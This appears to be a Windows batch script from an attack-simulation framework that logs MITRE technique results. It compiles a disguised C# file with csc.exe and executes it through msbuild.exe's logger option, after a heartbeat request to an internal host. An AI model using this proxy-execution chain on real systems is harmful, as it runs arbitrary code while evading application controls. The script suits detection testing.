@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET recnn=%APPDATA%\8633\8dc6d1cd
SET detcfkn=https://10.0.0.49
SET uouoq=https://10.0.0.49/stage/2/icon.png?8633-7
SET lqyereup=ITZEL-S2BS
SET ufeybybm=7
SET hpnjatpj=teams.txt
SET njozco=file.txt
SET kkjwr=8633
SET vnxn=%APPDATA%\%ufeybybm%\macula-simulations.log

echo [%DATE% %TIME%][DEBUG][%lqyereup%]: operation_name=heartbeat_start>> "%vnxn%" 2>nul
curl -k -s -o nul "%uouoq%"
echo [%DATE% %TIME%][DEBUG][%lqyereup%]: operation_name=heartbeat_complete>> "%vnxn%" 2>nul

cd /d "%recnn%"
echo [%DATE% %TIME%][DEBUG][%lqyereup%]: operation_name=chdir>> "%vnxn%" 2>nul

SET zvqq=1
SET fvts=
echo [%DATE% %TIME%][DEBUG][%lqyereup%]: operation_name=compile_start>> "%vnxn%" 2>nul
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /target:library /reference:Microsoft.Build.Framework.dll /out:"%hpnjatpj%" "%njozco%" >nul 2>&1
IF NOT EXIST "%hpnjatpj%" (SET zvqq=0&SET fvts=assembly_load_failed)
echo [%DATE% %TIME%][%lqyereup%]: %ufeybybm%-%kkjwr%-T1500|Compile After Delivery=%zvqq%:%fvts%>> "%vnxn%" 2>nul
IF %zvqq%==0 (echo [%DATE% %TIME%][DEBUG][%lqyereup%]: operation_name=compile_fail>> "%vnxn%" 2>nul&EXIT /B 1)
echo [%DATE% %TIME%][DEBUG][%lqyereup%]: operation_name=compile_success>> "%vnxn%" 2>nul

SET qvlg=1
SET gsln=
echo [%DATE% %TIME%][DEBUG][%lqyereup%]: operation_name=execution_start>> "%vnxn%" 2>nul
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe /logger:LoggerEntry,"%recnn%\%hpnjatpj%";MyParameters,Foo >nul 2>&1
IF !ERRORLEVEL! NEQ 0 (SET qvlg=0&SET gsln=execution_failed)
echo [%DATE% %TIME%][DEBUG][%lqyereup%]: operation_name=execution_end>> "%vnxn%" 2>nul
echo [%DATE% %TIME%][%lqyereup%]: %ufeybybm%-%kkjwr%-T1218|Signed Binary Proxy Execution=%qvlg%:%gsln%>> "%vnxn%" 2>nul